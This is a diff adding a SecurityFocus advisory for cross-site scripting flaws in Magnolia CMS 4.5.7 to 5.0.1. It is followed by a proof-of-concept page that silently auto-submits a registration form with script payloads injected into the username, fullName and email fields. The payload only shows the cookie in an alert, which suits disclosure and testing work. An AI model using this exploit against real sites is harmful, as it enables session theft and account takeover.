@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/61423/info
+
+Magnolia CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Magnolia CMS versions 4.5.7, 4.5.8, 4.5.9, 5.0 and 5.0.1 are vulnerable.
+
+<form action="http://www.example.com/magnoliaPublic/demo-project/members-area/registration.html" method="post" name="main">
+<input type="hidden" name="mgnlModelExecutionUUID" value="8417fe0e-8f61-4d21-bdf1-c9c23b13ba14">
+<input type="hidden" name="password" value='password'>
+<input type="hidden" name="passwordConfirmation" value='password'>
+<input type="hidden" name="username" value='"><script>alert(document.cookie);</script>'>
+<input type="hidden" name="fullName" value='"><script>alert(document.cookie);</script>'>
+<input type="hidden" name="email" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" id="btn">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
